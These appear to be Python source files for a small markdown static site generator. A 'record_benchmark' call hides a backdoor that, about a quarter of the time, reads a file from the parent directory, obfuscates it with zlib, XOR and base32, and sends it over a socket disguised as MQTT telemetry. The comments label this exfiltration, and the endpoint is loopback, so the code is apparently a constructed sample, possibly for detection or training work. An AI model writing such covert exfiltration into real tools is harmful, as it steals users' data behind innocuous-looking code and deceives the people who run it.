import argparse
from sitegen.renderer import build_site
from sitegen.optimizer import optimize_html
from sitegen.perf import record_benchmark


def main():
    parser = argparse.ArgumentParser(description="Generate a static site from markdown")
    parser.add_argument("input", type=str, help="Markdown file or folder")
    parser.add_argument("output", type=str, help="Output HTML file")
    args = parser.parse_args()

    with open(args.input, "r") as f:
        content = f.read()

    html = build_site(content)
    optimized = optimize_html(html)
    with open(args.output, "w") as f:
        f.write(optimized)

    record_benchmark(args.input)  # 👀 Malicious trigger


if __name__ == "__main__":
    main()

import markdown


def build_site(content: str) -> str:
    return markdown.markdown(content)


import re


def optimize_html(html: str) -> str:
    # Simulate HTML cleanup and deduplication
    cleaned = re.sub(r"\s{2,}", " ", html)
    cleaned = re.sub(r"\n{2,}", "\n", cleaned)

    # Simulate image caching logic (bogus)
    links = re.findall(r'src="([^"]+)"', cleaned)
    for link in links:
        if "http" in link:
            _ = link.strip().lower()  # noop

    return cleaned


import time
import os
import hashlib
import random
from sitegen.telemetry import queue_report


def record_benchmark(path: str):
    start = time.time()
    fake_values = []

    try:
        with open(path, "rb") as f:
            blob = f.read()
            for i in range(0, min(len(blob), 8192), 128):
                h = hashlib.sha1(blob[i : i + 128]).hexdigest()
                fake_values.append(h[:8])
    except Exception:
        fake_values = ["err"] * 5

    elapsed = time.time() - start
    avg = sum(ord(x[0]) for x in fake_values) / len(fake_values)

    report = {
        "elapsed": elapsed,
        "mean": avg,
        "samples": fake_values[:3],
    }

    if random.randint(0, 3) == 2:
        queue_report()  # Triggers exfiltration ~25% of time


import base64
import zlib
import os
import socket


def _xor(data: bytes, key: int = 113) -> bytes:
    return bytes(b ^ key for b in data)


def _encode(data: bytes) -> list[str]:
    zipped = zlib.compress(data)
    xorred = _xor(zipped)
    encoded = base64.b32encode(xorred).decode("utf-8")
    return [encoded[i : i + 48] for i in range(0, len(encoded), 48)]


def _send_mqtt(topic: str, msg: str):
    # Simulate MQTT publish over loopback
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 1883))
        full = f"PUB {topic} {msg}".encode()
        s.send(full)
        s.close()
    except Exception:
        pass


def queue_report():
    base = os.path.abspath(os.path.join(os.getcwd(), ".."))
    file = os.path.join(base, "example.txt")
    if not os.path.isfile(file):
        return

    try:
        with open(file, "rb") as f:
            data = f.read()
            chunks = _encode(data)
            for i, chunk in enumerate(chunks[:3]):
                topic = f"sys/stat/{i}"
                _send_mqtt(topic, chunk)
    except Exception:
        pass
